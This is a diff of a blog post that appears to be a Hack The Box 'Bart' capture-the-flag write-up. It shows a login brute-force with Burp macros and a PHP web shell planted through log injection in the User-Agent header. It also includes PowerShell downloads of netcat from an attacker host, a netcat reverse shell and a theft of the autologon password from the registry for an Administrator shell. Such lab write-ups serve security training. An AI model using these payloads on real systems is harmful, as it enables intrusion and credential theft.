@@ -7,11 +7,11 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Bart-Writeup" %}
 
 # Introduction
-The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of wordlist generation, log injection. This machine differs from other machines in the sense that is quite realistic.
+The hack the box machine "Bart" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge in the areas of wordlist generation. 
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
-By enumerating the target, it is possible to discover 
+By enumerating the target, it is possible to discover
 
 # Exploitation
 We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.81`. The `-sS`, `-sC` and `-sV` flags instruct nmap to perform a SYN scan to identify open ports followed by a script and version scan on the ports which were identified as open. The `-p-` flag instructs nmap to scan all the ports on the target. From the scan results, shown below, we can see that there is a web server on port 80.
@@ -38,11 +38,11 @@ Nmap done: 1 IP address (1 host up) scanned in 125.97 seconds
 └─$ 
 {% endhighlight %}
 
-If we try to navigate to [http://10.10.10.81](http://10.10.10.81) in a browser, we are redirected [http://forum.bart.htb](http://forum.bart.htb). However, our browser won't be able to find a host for this domain since it can not find any related DNS record which resolves to an IP address. 
+If we try to navigate to [http://10.10.10.81](http://10.10.10.81) in a browser, we are redirected to [http://forum.bart.htb](http://forum.bart.htb). However, our browser won't be able to find a host for this domain since it can not find any related DNS record which resolves to an IP address. 
 
 ![forum.bart.htb](/assets/{{ imgDir }}/forum.bart.htb.png)
 
-We can add the domain name `forum.bart.htb` to our `/etc/hosts` file and try again. 
+We can add the domain name `forum.bart.htb` to our `/etc/hosts` file to ensure that this domain resolves to the IP address of the target host. 
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -53,10 +53,22 @@ We can add the domain name `forum.bart.htb` to our `/etc/hosts` file and try aga
 └─$
 {% endhighlight %}
 
+If we attempt to re-visit the web page, we can see that it now loads properly. 
+
+![forum.bart.htb2](/assets/{{ imgDir }}/forum.bart.htb2.png)
+
+Scrolling down, we find the names of four employees.
+
+![team](/assets/{{ imgDir }}/team.png)
+
+![team2](/assets/{{ imgDir }}/team2.png)
+
+![team3](/assets/{{ imgDir }}/team3.png)
+We can also find an additional employee by inspecting the source code. This employee was excluded from the presentation of team members due to design limitations. In total, we have discovered five employees. These are `Samantha Brown`, `Daniel Simmons`, `Robert Hilton`, `Harvey Potter` and `Jane Doe`. Next, we can try to guess directories and file names with [ffuf]() for the domains `bart.htb` and `forum.bart.htb`. We use the `-u` flag to specify the target URL and the `-w` to specify a wordlist we want to use. We also include the `-ic` to include any comments in the wordlist.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ ffuf -u http://bart.htb/FUZZ -ic -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  
+└─$ @@ffuf -u http://bart.htb/FUZZ -ic -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt@@
 
         /'___\  /'___\           /'___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
@@ -94,10 +106,12 @@ search                  [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631
 news                    [Status: 200, Size: @@@158607@@@, Words: 663, Lines: 631]
 [WARN] Caught keyboard interrupt (Ctrl-C)
 {% endhighlight %}
-It goes really fast and we have to interrupt it. It appears that almost every request we send results in the same response. We can inspect this response by requesting [http://bart.htb/login](http://bart.htb/login) in a browser. Visiting this results in the custom `404 Not Found` page below.
 
+Once we execute the command, we can notice that almost every request we send results in the same response. We can inspect this response by requesting [http://bart.htb/login](http://bart.htb/login) in a browser. Visiting this link results in the custom `404 Not Found` page below.
 
-We can filter out this page by ignoring any responses which have 158607 bytes using the `-f` flag.
+![custom404](/assets/{{ imgDir }}/custom404.png)
+
+We can use the `-fs` flag to ignore this page by ignoring any responses which contain `158607` bytes.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -125,140 +139,394 @@ ________________________________________________
 ________________________________________________
 
                         [Status: 302, Size: 0, Words: 1, Lines: 1]
-forum                   [Status: 301, Size: 145, Words: 9, Lines: 2]
-monitor                 [Status: 301, Size: 147, Words: 9, Lines: 2]
-[WARN] Caught keyboard interrupt (Ctrl-C)
+@@@forum@@@                   [Status: @@@301@@@, Size: 145, Words: 9, Lines: 2]
+@@@monitor@@@                 [Status: @@@301@@@, Size: 147, Words: 9, Lines: 2]
+                        [Status: 302, Size: 0, Words: 1, Lines: 1]
+:: Progress: [81630/81630] :: Job [1/1] :: 29 req/sec :: Duration: [1:07:37] :: Errors: 148 ::
 {% endhighlight %}
 
-The results of the directory bruteforce suggests that there are two directories. The first is `/forum` which redirects to `/forum/` which is identical to `forum.bart.htb`. The second one is `/monitor` which redirects us to `monitor.bart.htb`. However, before we can access `monitor.bart.htb`, we must add it to our `/etc/hosts` file. We can use `sed` to delete the previous entry we created and then add a new entry with all the domain names we have discovered so far.
+The results of the directory bruteforce suggests that there are two directories. The first is `/forum` which redirects to `/forum/` which is identical to `forum.bart.htb`. The second one is `/monitor` which redirects us `/monitor/` which prompts us for credentials, as shown below. Fuzzing the `forum.bart.htb` domain with the same wordlist did not result in anything except for the `/` page.
 
+![monitor](/assets/{{ imgDir }}/monitor.png)
+
+We could try to guess correct credentials through a brute force attack. We can use the names of five employeese to manually create a list of potential usernames, as shown below.
 {% highlight none linenos %}
-Placeholder
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cat users@@                                   
+samantha
+daniel
+robert
+harvey
+jane
+s.brown
+d.simmons
+r.hilton
+h.potter
+j.doe
+samantha.brown
+daniel.simmons
+robert.hilton
+harvey.potter
+jane.doe
+                                                     
+┌──(kali㉿kali)-[/tmp/x]
+└─$
 {% endhighlight %}
 
-
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-
-ffuf -u http://bart.htb/FUZZ -ic -fs 158607 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt 
-We use -fs to filter out 404 pages
-
-We find /monitor
-
-We can generate a wordlist using [cewl]().
+Next, we can generate a wordlist of potential passwords using [cewl]() which is a tool for generating a wordlist based on a website. We use the `-w` flag to specify an output file and the `--lowercase` flag to instruct `cewl` that we want a lowercase wordlist.  This results in a wordlist containing 231 potential lowercase password. We can execute `cat wordlist | sed 's/.*/\u&/' | tee -a wordlist` to double the number of passwords by creating a copy of each potential password where the first character has been swapped to the corresponding uppercase character. For example, the password `secret` would become `Secret`. At this point, we have 462 potential passwords. We could try to perform a brute force attack using Burp suite's `Intruder` tool with the list of potential usernames and passwords.
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
-└─$ @@cewl http://forum.bart.htb > wordlist@@
-                                                                                                                    
+└─$ @@cewl -w wordlist --lowercase http://forum.bart.htb/@@
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cat wordlist | wc -l@@                               
+@@@231@@@
+                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@cat wordlist | sed 's/.*/\u&/' | tee -a wordlist@@
+[...]
 ┌──(kali㉿kali)-[/tmp/x]
 └─$ @@cat wordlist | wc -l@@
-@@@250@@@
+@@@462@@@
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ 
 {% endhighlight %}
 
+![loginx](/assets/{{ imgDir }}/loginx.png)
 
-we log in to /monitor with harvey:potter
+To see how a login request looks like, we can attempt to login with a random username and password using the built-in Burp Suite browser. The request, shown above, is a POST request which contains the parameters `csrf`, `username`, `password` and `login`. The first parameter is a CSRF token which is a string containing random characters. CSRF tokens are normally submitted together with forms to ensure that cross-domain requests require read-access to the domain they are targetting. This prevents one domain's JavaScript from doing things on another domain without user consent.
 
-a redirect is performed to monitor.bart.htb
+![loginx2](/assets/{{ imgDir }}/loginx2.png)
 
-We add monitor.bart.htb to our `/etc/hosts` file and reload the page
+![loginForm](/assets/{{ imgDir }}/loginForm.png)
 
-sudo sed -i '/^10.10.10.81/d' /etc/hosts
-echo '10.10.10.81\tmonitor.bart.htb\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts 
+If we inspect the source code of the login page, we can see that the CSRF token is included in the login form. This token changes every time the login form is reloaded and should thus be different with every log in attempt. This means that the login form should be loaded before each authentication attempt in a brute force attack, since the login form contains a valid value for the CSRF token. Fortunately, Burp Suite supports macros which makes it possible to dynamically set the value of the `CSRF` variable. We can find the macro configurations by clicking the `Project options` tab and pressing the `Sessions` subtab.
 
-We log in again
+TODO: Background on macros?
+TODO: CSRF token bakground?
 
-Click "Servers" page => We find internal-01.bart.htb
+![macro](/assets/{{ imgDir }}/macro.png)
 
-Visiting the URL http://internal-01.bart.htb leads to a redirection to http://internal-01.bart.htb/simple_chat/login_form.php
+We press the `Add` button to add a macro. This opens the window below, where we can select a request. We select the GET request which was sent earlier to load the login form. Then, we press the `OK` button twice to register this macro as a macro named "Macro 1".
 
-googling "simple_chat" leads us to https://github.com/magkopian/php-ajax-simple-chat
+![recordMacro](/assets/{{ imgDir }}/recordMacro.png)
 
+![recordMacro2](/assets/{{ imgDir }}/recordMacro2.png)
+
+![shr](/assets/{{ imgDir }}/shr.png)
+
+At the top of the `Sessions` tab in Burp Suite, we find configurations for session handling rules. Here, we press the `Add` button to open the `Session handling rule editor` window.
+
+![shr2](/assets/{{ imgDir }}/shr2.png)
+
+![shr3](/assets/{{ imgDir }}/shr3.png)
+In this window, we press the `Add` button and select `Run a macro` in the dropdown. Then, we select our macro. We check the `Update only the following parameters` checkbox and enter "csrf" since this is the name of the parameter which we want to set dynamically. Then, we press `OK` and press the `Scope` tab.
+
+![shr4](/assets/{{ imgDir }}/shr4.png)
+
+In the `Scope` tab, we click `Use custom scope` and enter `http://bart.htb/` as a scope prefix. This will ensure that our macro is executed before any request to the `bart.htb` domain and that this request will include an updated value for the `csrf` parameter. We can press `OK` to save the configurations and close the window.
+
+![shr5](/assets/{{ imgDir }}/shr5.png)
+
+Next, we will use the intruder to perform our brute force attack. We start by right-clicking the login request and pressing `Send to Intruder` in the dropdown.
+
+![intruder](/assets/{{ imgDir }}/intruder.png)
+
+Then, we set the `user_name` and `user_password` fields as payload positions. We also select the attack type `cluster bomb` since this attack type will ensure that all permutations of users and passwords will be attempted. 
+
+![intruder2](/assets/{{ imgDir }}/intruder2.png)
+
+Next, we press the `payloads` tab to configure what to inject into the payload positions. For payload set 1, we press the `Load...` button and select the `users` file we created earlier. Similarly, for payload set 2, we press the `Load...` button and select the `wordlist` file we created earlier.
+
+![intruderUsername](/assets/{{ imgDir }}/intruderUsername.png)
+
+![intruderPassword](/assets/{{ imgDir }}/intruderPassword.png)
+
+At this point, we have configured everything we need and we can start the brute force attack by pressing the red `Start attack` button in the top-right corner.
+
+![bfOK](/assets/{{ imgDir }}/bfOK.png)
+
+After a couple of minutes, we see a requests which results in a `302 Found` rather than a `200 OK`, indicating that we authenticated successfully! This authentication was performed with the username `harvey` and password `potter`. 
+
+![loginResponse](/assets/{{ imgDir }}/loginResponse.png)
+
+If we inspect the response content, we can see that it redirects us to the `monitor.bart.htb` domain. Before we can access this domain, we will need to add it to our `/etc/hosts` file. We can use `sed` to delete the previous entry we created and then add a new entry with all the domain names we have discovered so far.
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo sed -i '/^10.10.10.81/d' /etc/hosts@@
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@echo '10.10.10.81\tmonitor.bart.htb\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts@@
+10.10.10.81     monitor.bart.htb        forum.bart.htb  bart.htb
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ 
+{% endhighlight %}
+
+If we log in at [http://bart.htb/monitor/](http://bart.htb/monitor/) with the username `harvey` and password `potter`, we are redirected to a web application for server monitoring.
+
+![loginHarvey](/assets/{{ imgDir }}/loginHarvey.png)
+
+![monitorStatus](/assets/{{ imgDir }}/monitorStatus.png)
+
+The web application displays a green rectangle which corresponds to an internal chat. If we click this rectangle, we reach a page containing information about this internal chat.
+
+![monitorInfo](/assets/{{ imgDir }}/monitorInfo.png)
+
+ Among the information is a link to the domain `internal-01.bart.htb`. We can add this domain to our `/etc/hosts` file and then visit the link.
+
+{% highlight none linenos %}
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo sed -i '/^10.10.10.81/d' /etc/hosts@@                                     
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@echo '10.10.10.81\tinternal-01.bart.htb\tmonitor.bart.htb\tforum.bart.htb\tbart.htb' | sudo tee -a /etc/hosts@@ 
+10.10.10.81     internal-01.bart.htb    monitor.bart.htb        forum.bart.htb  bart.htb
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ 
+{% endhighlight %}
+
+Visiting the URL [http://internal-01.bart.htb](http://internal-01.bart.htb) results in a redirection to [http://internal-01.bart.htb/simple_chat/login_form.php](http://internal-01.bart.htb/simple_chat/login_form.php) which displays a login form. 
+
+![login2](/assets/{{ imgDir }}/login2.png)
+
+![google](/assets/{{ imgDir }}/google.png)
+
+If we search for "simple_chat" on google, we find a github repository [https://github.com/magkopian/php-ajax-simple-chat](https://github.com/magkopian/php-ajax-simple-chat). This repository contains a folder named "simple_chat" which contains a file named "login_form.php". As such, this might be the source code of the web application we are dealing with.
+
+![github](/assets/{{ imgDir }}/github.png)
+
+By studying repostiory more closely, it is possible to find a file name "register.php" which let's anyone create an account. Relevant parts of this file are displayed below. At line x to x, an if clause checks if a username was provided in a parameter named "uname". If the parameter was provided, its value is validated using the function `validate_username`. Similarly, at line x to x, an if clause checks if a password is provided in a parameter named "passwd" and validates this password. If no errors occur, the code between line x and x is executed. This code attempts to register a new account on line x and then redirects the user to the login form at line x, if the registration is successful.  
+
+{% highlight php linenos %}
+[...]
+$errors = array();
+
+//check if username is provided
+if (!isset($_POST['uname']) || empty($_POST['uname'])) {
+	$errors['uname'] = 'The Username is required';
+} else {
+	//validate username
+	if (($uname = validate_username($_POST['uname'])) === false) {
+		$errors['uname'] = 'The Username is invalid';
+	}
+}
+
+//check if password is provided
+if (!isset($_POST['passwd']) || empty($_POST['passwd'])) {
+	$errors['passwd'] = 'The Password is required';
+} else {
+	//validate password
+	
+	if (($passwd = validate_password($_POST['passwd'])) === false) {
+		$errors['passwd'] = 'The Password must be at least 8 characters';
+	}
+}
+[...]
+//check for form field errors
+if (!empty($errors)) { //if there are any errors
+	$_SESSION['reg_errors'] = $errors; //set a session variable to pass them to the registration form page
+}
+else { //if no errors try to register
+	if (($res = register($uname, $passwd)) === false) { //if database error
+		$errors['uname'] = 'An error has been occurred'; //we want it to appear above username field
+		$_SESSION['reg_errors'] = $errors; //set a session variable to pass them to the registration form page
+	}
+	else if ($res === -1) { //if user already exists	
+		$errors['uname'] = 'Username already exists'; //we want it to appear above username field
+		$_SESSION['reg_errors'] = $errors; //set a session variable to pass them to the registration form page
+	}
+	else {
+		if (get_last_page() !== false) {
+			header('Location: login_form.php?ref=reg'); //after sucessful register goto the login page
+			die();
+		}
+		else {
+			header('Location: ../'); //you can replace this redirect with one to the chat page of your site if you want
+			die();
+		}
+	}
+}
+[...]
+{% endhighlight %}
+
+We can try to reconstruct a registration request using the information from this file. For example, if we want to register an account with the username `test` and password `Testing123!`, we can send the request below.
+
+{% highlight none linenos %}
 POST /simple_chat/register.php HTTP/1.1
 Host: internal-01.bart.htb
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 33
 
 uname=test&passwd=Testing123!
-
-GET /log/log.php?filename=ws.php&username=harvey HTTP/1.1
-Host: internal-01.bart.htb
-User-Agent: <?php system($_GET['c']); ?>
-Accept: */*
-Referer: http://internal-01.bart.htb/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Cookie: PHPSESSID=abglkpe7dbegm7s866jb7k17s5
-Connection: close
-
-GET /log/ws.php?c=whoami HTTP/1.1
-Host: internal-01.bart.htb
-Accept: */*
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
-Referer: http://internal-01.bart.htb/
-Accept-Encoding: gzip, deflate
-Accept-Language: en-US,en;q=0.9
-Connection: close
-
-We use n64.exe from.
-https://eternallybored.org/misc/netcat/
-
-sudo python3 -m http.server 80
-
-powershell "wget http://10.10.16.2/nc64.exe -OutFile nc64.exe"
-
-GET /log/ws.php?c=%70%6f%77%65%72%73%68%65%6c%6c%20%22%77%67%65%74%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%36%2e%32%2f%6e%63%36%34%2e%65%78%65%20%2d%4f%75%74%46%69%6c%65%20%6e%63%36%34%2e%65%78%65%22
-
-
-PS C:\inetpub\wwwroot\internal-01\log> Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
-Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
-
-DefaultDomainName DefaultUserName DefaultPassword                 
------------------ --------------- ---------------                 
-DESKTOP-7I3S68E   Administrator   3130438f31186fbaf962f407711faddb
-
- Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain
-
-Gives us "BART"
-
-{% highlight none linenos %}
-Placeholder
 {% endhighlight %}
 
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
+If we send the request, we receive the response below, which is a redirection to `../`. If we follow this redirection, we get another redirection to `simple_chat/login_form.php` which is the login form we saw earlier.
+
+![registerTest](/assets/{{ imgDir }}/registerTest.png)
+
+![registerTest2](/assets/{{ imgDir }}/registerTest2.png)
+
+If we try to log in with the username `test` and password `Testing123!`, we are successful and we are presented with an internal chat application.
+
+![internalChat](/assets/{{ imgDir }}/internalChat.png)
+
+There are two buttons labeled "refresh" and "log" in the top right corner of this chat. Pressing the `refresh` button simply refreshes the chat. The `log` button, however, resutls in a request to `/log/log.php`. 
+
+![logRaw](/assets/{{ imgDir }}/logRaw.png)
+
+![logRawResp](/assets/{{ imgDir }}/logRawResp.png)
+
+This request results in the response shown above which only contains the number `1`. The request included a `filename` parameter with the value `log.txt`. Requesting this file with a GET request indicates that the `log.php` script is logging the username provided in the username parameter together with user agent from the `User-Agent` header. 
+
+![logtxt](/assets/{{ imgDir }}/logtxt.png)
+
+![logtxtResp](/assets/{{ imgDir }}/logtxtResp.png)
+
+We could try to upload a PHP web shell by including it in the `User-Agent` header field and changing the filename to `ws.php`, as demonstrated below.
+
+![uploadWS](/assets/{{ imgDir }}/uploadWS.png)
+
+![uploadWSResp](/assets/{{ imgDir }}/uploadWSResp.png)
+
+If we try to execute the command `whoami`, using the webshell, we can see that our PHP web shell payload was uploaded successfully and provides us with code execution as `nt authority\iusr`! 
+
+![whoami](/assets/{{ imgDir }}/whoami.png)
+
+![whoamiResp](/assets/{{ imgDir }}/whoamiResp.png)
+
+we can execute the command `powershell "[Environment]::Is64BitOperatingSystem"` to check if we are dealing with a 32-bit or 64-bit operating system. Upon doing this, we get the output `True`, meaning that the target operating system is 64-bit. As such, we will use the 64-bit version of netcat to ensure that our reverse shell process is a 64-bit process.
+
+![64bit](/assets/{{ imgDir }}/64bit.png)
+
+We can download the 64-bit version of netcat from [https://eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/). Once downloaded, we execute `python3 -m http.server 80` to start a python web server.
 
 {% highlight none linenos %}
-Placeholder
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip@@
+--2022-05-08 08:18:16--  https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
+Resolving eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
+Connecting to eternallybored.org (eternallybored.org)|84.255.206.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 109604 (107K) [application/zip]
+Saving to: ‘netcat-win32-1.11.zip’
+
+netcat-win32-1.11.zip        100%[==============================================>] 107.04K   535KB/s    in 0.2s    
+
+2022-05-08 08:18:17 (535 KB/s) - ‘@@@netcat-win32-1.11.zip@@@’ @@@saved@@@ [109604/109604]
+
+                                                                                                                    
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@unzip netcat-win32-1.11.zip@@
+Archive:  netcat-win32-1.11.zip
+  inflating: netcat-1.11/doexec.c    
+  inflating: netcat-1.11/generic.h   
+  inflating: netcat-1.11/getopt.c    
+  inflating: netcat-1.11/getopt.h    
+  inflating: netcat-1.11/hobbit.txt  
+  inflating: netcat-1.11/license.txt  
+  inflating: netcat-1.11/Makefile    
+  inflating: netcat-1.11/nc.exe      
+  inflating: netcat-1.11/@@@nc64.exe@@@
+  inflating: netcat-1.11/netcat.c    
+  inflating: netcat-1.11/readme.txt  
+
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@mv ./netcat-1.11/nc64.exe ./nc64.exe@@
+
+┌──(kali㉿kali)-[/tmp/x]
+└─$ @@sudo python3 -m http.server 80@@
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 {% endhighlight %}
 
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
+Next, we execute the command `powershell "wget http://10.10.16.2/netcat-1.11/nc64.exe -OutFile nc64.exe"` to download the netcat binary to the target host. This can be performed by requesting [http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe"](http://internal-01.bart.htb/log/ws.php?c=powershell+"wget+http%3a//10.10.16.2/nc64.exe+-OutFile+nc64.exe").
 
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
+![revShell](/assets/{{ imgDir }}/revShell.png)
 
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
+Thereafter, we execute `nc -lvp 443` to start a netcat listener on port 443. The next step is to execute `.\nc64.exe -e powershell.exe 10.10.16.2 443` using the web shell by visting [http://internal-01.bart.htb/log/ws.php?c=.\nc64.exe+-e+powershell.exe+10.10.16.2+443](http://internal-01.bart.htb/log/ws.php?c=.\nc64.exe+-e+powershell.exe+10.10.16.2+443). Upon execution of this command, the listener receives a connection and we have an interacive shell on the target!
 
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
-
-{% highlight none linenos %}
-Placeholder
-{% endhighlight %}
 
 # Privilege Escalation
+The Windows Registry can be used to configure Windows for a cascade of use cases. One of these is to [configure automatic logons](https://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon). This feature allows anyone to log in automatically with a preconfigured account. Credentails for this preconfigured account are usually stored under the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon`. If we query the registry for this key, we discover that autologons are configured for the `Administrator` account!
 
+{% highlight none linenos %}
+PS C:\inetpub\wwwroot\internal-01\log> @@Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'@@
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'
+
+
+AutoRestartShell             : 1
+Background                   : 0 0 0
+CachedLogonsCount            : 10
+DebugServerCommand           : no
+@@@DefaultDomainName@@@            : @@@DESKTOP-7I3S68E@@@
+@@@DefaultUserName@@@              : @@@Administrator@@@
+DisableBackButton            : 1
+EnableSIHostIntegration      : 1
+ForceUnlockLogon             : 0
+LegalNoticeCaption           : 
+LegalNoticeText              : 
+PasswordExpiryWarning        : 5
+PowerdownAfterShutdown       : 0
+PreCreateKnownFolders        : {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+ReportBootOk                 : 1
+Shell                        : explorer.exe
+ShellCritical                : 0
+ShellInfrastructure          : sihost.exe
+SiHostCritical               : 0
+SiHostReadyTimeOut           : 0
+SiHostRestartCountLimit      : 0
+SiHostRestartTimeGap         : 0
+Userinit                     : C:\Windows\system32\userinit.exe,
+VMApplet                     : SystemPropertiesPerformance.exe /pagefile
+WinStationsDisabled          : 0
+scremoveoption               : 0
+DisableCAD                   : 1
+LastLogOffEndTimePerfCounter : 332637038
+ShutdownFlags                : 2147483699
+AutoAdminLogon               : 1
+DisableLockWorkstation       : 0
+EnableFirstLogonAnimation    : 1
+AutoLogonSID                 : S-1-5-21-988671444-1802818203-1364644418-500
+LastUsedUsername             : Administrator
+@@@DefaultPassword@@@              : @@@3130438f31186fbaf962f407711faddb@@@
+PSPath                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
+                               ACHINE\SOFTWARE\Microsoft\Windows 
+                               NT\CurrentVersion\WinLogon
+PSParentPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_M
+                               ACHINE\SOFTWARE\Microsoft\Windows 
+                               NT\CurrentVersion
+PSChildName                  : WinLogon
+PSProvider                   : Microsoft.PowerShell.Core\Registry
+
+
+
+PS C:\inetpub\wwwroot\internal-01\log>
+{% endhighlight %}
+
+Among other things, the output of the command discloses the default username, default password and default domain. We should be able to use these to obtain a shell as the `Administrator` user on the target host. To do this, we need to create a [SecureString](https://docs.microsoft.com/en-us/dotnet/api/system.security.securestring) object using the password, use the SecureString object to create a [PowerShell Credential](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential) object and use the PowerShell credential object to obtain code execution. We can create the SecureString and PowerShell credential objects as demonstrated below.
+
+{% highlight none linenos %}
+PS C:\inetpub\wwwroot\internal-01\log> @@$secstr = New-Object -TypeName System.Security.SecureString@@
 $secstr = New-Object -TypeName System.Security.SecureString
+PS C:\inetpub\wwwroot\internal-01\log> @@"3130438f31186fbaf962f407711faddb".ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}@@
 "3130438f31186fbaf962f407711faddb".ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
-$creds = new-object -typename System.Management.Automation.PSCredential -argumentlist "BART\Administrator", $secstr
+PS C:\inetpub\wwwroot\internal-01\log> @@$creds = new-object -typename System.Management.Automation.PSCredential -argumentlist "DESKTOP-7I3S68E\Administrator", $secstr@@
+$creds = new-object -typename System.Management.Automation.PSCredential -argumentlist "DESKTOP-7I3S68E\Administrator", $secstr
+PS C:\inetpub\wwwroot\internal-01\log>
+{% endhighlight %}
+
+Finally, we execute `nc -lvp 443` to start a netcat listener and use the [Invoke-Command](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command) cmdlet to instruct the target host to execute `nc64.exe -e powershell.exe 10.10.16.2 443` as the `Administrator` user.
+
+{% highlight none linenos %}
+PS C:\inetpub\wwwroot\internal-01\log> @@Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc64.exe -e powershell.exe 10.10.16.2 443 } -Credential $creds -Computer localhost@@
 Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc64.exe -e powershell.exe 10.10.16.2 443 } -Credential $creds -Computer localhost
+{% endhighlight %}
+
+![rootShell](/assets/{{ imgDir }}/rootShell.png)
+
+Once we execute the `Invoke-Command` command, our original shell freezes and we obtain a new shell as the `Administrator` user!
